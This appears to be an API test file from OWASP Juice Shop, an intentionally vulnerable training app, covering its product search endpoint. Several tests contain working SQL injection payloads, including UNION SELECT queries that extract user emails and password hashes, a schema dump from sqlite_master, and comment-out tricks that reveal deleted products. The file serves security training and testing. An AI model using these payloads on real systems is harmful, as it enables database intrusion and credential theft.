/*
 * Copyright (c) 2014-2023 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import frisby = require('frisby')
import { Product } from '../../data/types'
import config from 'config'
const security = require('../../lib/insecurity')

const christmasProduct = config.get<Product[]>('products').filter(({ useForChristmasSpecialChallenge }: Product) => useForChristmasSpecialChallenge)[0]
const pastebinLeakProduct = config.get<Product[]>('products').filter(({ keywordsForPastebinDataLeakChallenge }: Product) => keywordsForPastebinDataLeakChallenge)[0]

const API_URL = 'http://localhost:3000/api'
const REST_URL = 'http://localhost:3000/rest'

describe('/rest/products/search', () => {
  it('GET product search with no matches returns no products', () => {
    return frisby.get(`${REST_URL}/products/search?q=nomatcheswhatsoever`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(0)
      })
  })

  it('GET product search with one match returns found product', () => {
    return frisby.get(`${REST_URL}/products/search?q=o-saft`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(1)
      })
  })

  it('GET product search fails with error message that exposes ins SQL Injection vulnerability', () => {
    return frisby.get(`${REST_URL}/products/search?q=';`)
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', `<h1>${config.get('application.name')} (Express`)
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;;&quot;: syntax error')
  })

  it('GET product search SQL Injection fails from two missing closing parenthesis', () => {
    return frisby.get(`${REST_URL}/products/search?q=' union select id,email,password from users--`)
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', `<h1>${config.get('application.name')} (Express`)
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;union&quot;: syntax error')
  })

  it('GET product search SQL Injection fails from one missing closing parenthesis', () => {
    return frisby.get(`${REST_URL}/products/search?q=') union select id,email,password from users--`)
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', `<h1>${config.get('application.name')} (Express`)
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;union&quot;: syntax error')
  })

  it('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns', () => {
    return frisby.get(`${REST_URL}/products/search?q=')) union select * from users--`)
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', `<h1>${config.get('application.name')} (Express`)
      .expect('bodyContains', 'SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns', () => {})
  })

  it('GET product search can create UNION SELECT with Users table and fixed columns', () => {
    return frisby.get(`${REST_URL}/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        id: '1',
        name: '2',
        description: '3',
        price: '4',
        deluxePrice: '5',
        image: '6',
        createdAt: '7',
        updatedAt: '8'
      })
  })

  it('GET product search can create UNION SELECT with Users table and required columns', () => {
    return frisby.get(`${REST_URL}/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        id: 1,
        price: `admin@${config.get('application.domain')}`,
        deluxePrice: security.hash('admin123')
      })
      .expect('json', 'data.?', {
        id: 2,
        price: `jim@${config.get('application.domain')}`,
        deluxePrice: security.hash('ncc-1701')
      })
      .expect('json', 'data.?', {
        id: 3,
        price: `bender@${config.get('application.domain')}`
        // no check for Bender's password as it might have already been changed by different test
      })
      .expect('json', 'data.?', {
        id: 4,
        price: 'bjoern.kimminich@gmail.com',
        deluxePrice: security.hash('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
      })
      .expect('json', 'data.?', {
        id: 5,
        price: `ciso@${config.get('application.domain')}`,
        deluxePrice: security.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
      })
      .expect('json', 'data.?', {
        id: 6,
        price: `support@${config.get('application.domain')}`,
        deluxePrice: security.hash('J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P')
      })
  })

  it('GET product search can create UNION SELECT with sqlite_master table and required column', () => {
    return frisby.get(`${REST_URL}/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        id: 'CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))'
      })
      .expect('json', 'data.?', {
        id: 'CREATE TABLE sqlite_sequence(name,seq)'
      })
  })

  it('GET product search cannot select logically deleted christmas special by default', () => {
    return frisby.get(`${REST_URL}/products/search?q=seasonal%20special%20offer`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(0)
      })
  })

  it('GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination', () => {
    return frisby.get(`${REST_URL}/products/search?q=seasonal%20special%20offer'))--`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(0)
      })
  })

  it('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause', () => {
    return frisby.get(`${REST_URL}/products/search?q=${christmasProduct.name}'))--`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(1)
        expect(json.data[0].name).toBe(christmasProduct.name)
      })
  })

  it('GET product search can select logically deleted unsafe product by forcibly commenting out the remainder of where clause', () => {
    return frisby.get(`${REST_URL}/products/search?q=${pastebinLeakProduct.name}'))--`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(1)
        expect(json.data[0].name).toBe(pastebinLeakProduct.name)
      })
  })

  it('GET product search with empty search parameter returns all products', () => {
    return frisby.get(`${API_URL}/Products`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        const products = json.data
        return frisby.get(`${REST_URL}/products/search?q=`)
          .expect('status', 200)
          .expect('header', 'content-type', /application\/json/)
          .then(({ json }) => {
            expect(json.data.length).toBe(products.length)
          })
      })
  })

  it('GET product search without search parameter returns all products', () => {
    return frisby.get(`${API_URL}/Products`)
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        const products = json.data
        return frisby.get(`${REST_URL}/products/search`)
          .expect('status', 200)
          .expect('header', 'content-type', /application\/json/)
          .then(({ json }) => {
            expect(json.data.length).toBe(products.length)
          })
      })
  })
})
